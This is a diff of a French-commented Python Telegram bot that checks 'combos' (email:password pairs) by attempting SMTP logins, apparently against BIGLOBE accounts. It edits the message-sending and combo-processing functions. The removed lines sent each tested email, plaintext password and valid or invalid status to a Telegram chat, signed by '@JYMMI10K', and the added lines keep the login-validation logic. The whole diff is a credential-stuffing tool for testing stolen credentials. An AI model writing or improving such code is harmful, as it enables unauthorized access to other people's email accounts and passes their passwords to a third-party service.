@@ -500,12 +500,24 @@ Commandes disponibles :
         """Envoie un message sur Telegram"""
         try:
             print(f"📤 Tentative d'envoi de message Telegram : {message[:50]}...")
+            
+            # Vérifier que le token et le chat ID sont configurés
+            if not self.TELEGRAM_BOT_TOKEN or not self.TELEGRAM_CHAT_ID:
+                print("❌ Token ou Chat ID non configuré")
+                return
+                
+            # Initialiser le bot si nécessaire
             if not self.telegram_bot:
                 print("🤖 Initialisation du bot Telegram...")
                 self.telegram_bot = Bot(token=self.TELEGRAM_BOT_TOKEN)
             
+            # Envoyer le message
             print(f"📱 Envoi du message au chat {self.TELEGRAM_CHAT_ID}...")
-            await self.telegram_bot.send_message(chat_id=self.TELEGRAM_CHAT_ID, text=message)
+            await self.telegram_bot.send_message(
+                chat_id=self.TELEGRAM_CHAT_ID,
+                text=message,
+                parse_mode='HTML'
+            )
             print("✅ Message envoyé avec succès")
             
         except Exception as e:
@@ -570,86 +582,38 @@ Commandes disponibles :
     async def process_combo(self, combo: str, receiver: str) -> Optional[str]:
         """Traite un combo et vérifie sa validité"""
         try:
-            if not combo or ":" not in combo:
-                print(f"❌ Format de combo invalide : {combo}")
+            print(f"🔍 Vérification du combo : {combo}")
+            
+            # Vérifier le format du combo
+            if ":" not in combo:
+                print("❌ Format de combo invalide")
                 return None
                 
             email, password = combo.split(":", 1)
-            if not email or not password:
-                print(f"❌ Email ou mot de passe manquant : {combo}")
-                return None
-                
-            print(f"🔍 Vérification de : {email}")
             
             # Vérifier le format de l'email
-            if not "@" in email or not "." in email:
-                print(f"❌ Format d'email invalide : {email}")
+            if "@" not in email or "." not in email:
+                print("❌ Format d'email invalide")
                 return None
                 
             # Vérifier la longueur du mot de passe
             if len(password) < 4:
-                print(f"❌ Mot de passe trop court : {email}")
+                print("❌ Mot de passe trop court")
                 return None
                 
+            # Tester la connexion SMTP
+            print("⏳ Test de connexion SMTP...")
             is_valid = await self.send_test_mail(email, password, receiver)
-
-            with self.print_lock:
-                status = "✅ VALID" if is_valid else "❌ INVALID"
-                if is_valid:
-                    self.bot_state['valid_count'] += 1
-                    self.bot_state['last_valid'] = combo
-                else:
-                    self.bot_state['invalid_count'] += 1
-
-                message = f"""
-🔰 BIGLOBE VALIDATOR 🔰
-━━━━━━━━━━━━━━━━━━━━
-📧 Email: {email}
-🔑 Password: {password}
-📊 Status: {status}
-📈 Restants: {self.remaining - 1}
-━━━━━━━━━━━━━━━━━━━━
-💻 By @JYMMI10K
-"""
-                print(f"{status} {email}   | Restants : {self.remaining - 1}")
-                await self.send_telegram_message(message)
-                await self.send_stats()
-
-            self.remaining -= 1
             
-            # Envoi d'un message tous les 100 combos
-            if self.remaining % 100 == 0:
-                progress_message = f"""
-📊 PROGRESSION TOUS LES 100 COMBOS 📊
-━━━━━━━━━━━━━━━━━━━━
-⏱️ Temps écoulé: {int((time.time() - self.start_time)/60)}m {int((time.time() - self.start_time)%60)}s
-📈 Progression: {self.total_combos - self.remaining}/{self.total_combos} ({int(((self.total_combos - self.remaining)/self.total_combos)*100)}%)
-✅ Valides: {len(self.valid_results)}
-❌ Invalides: {self.invalid_count}
-⏳ Timeouts: {self.timeout_count}
-🚀 Vitesse: {(self.total_combos - self.remaining)/(time.time() - self.start_time):.2f} combos/min
-⏳ Temps estimé restant: {int((self.remaining/((self.total_combos - self.remaining)/(time.time() - self.start_time)))/60)}m {int((self.remaining/((self.total_combos - self.remaining)/(time.time() - self.start_time)))%60)}s
-━━━━━━━━━━━━━━━━━━━━
-💻 By @JYMMI10K
-"""
-                await self.send_telegram_message(progress_message)
-            
-            await asyncio.sleep(self.DELAY_BETWEEN_CHECKS)
-            
-            with self.valid_lock:
-                processed = len(self.valid_results) + self.invalid_count
-                if processed % 10 == 0:  # Mise à jour tous les 10 combos
-                    await self.send_progress_update(
-                        processed=processed,
-                        total=self.total_combos,
-                        valid=len(self.valid_results),
-                        invalid=self.invalid_count
-                    )
-            
-            return combo if is_valid else None
-            
+            if is_valid:
+                print(f"✅ Combo valide : {email}")
+                return combo
+            else:
+                print(f"❌ Combo invalide : {email}")
+                return None
+                
         except Exception as e:
-            print(f"❌ Erreur lors du traitement du combo {combo} : {str(e)}")
+            print(f"❌ Erreur lors du traitement : {str(e)}")
             return None
 
     def load_combos(self, filepath: str) -> List[str]:
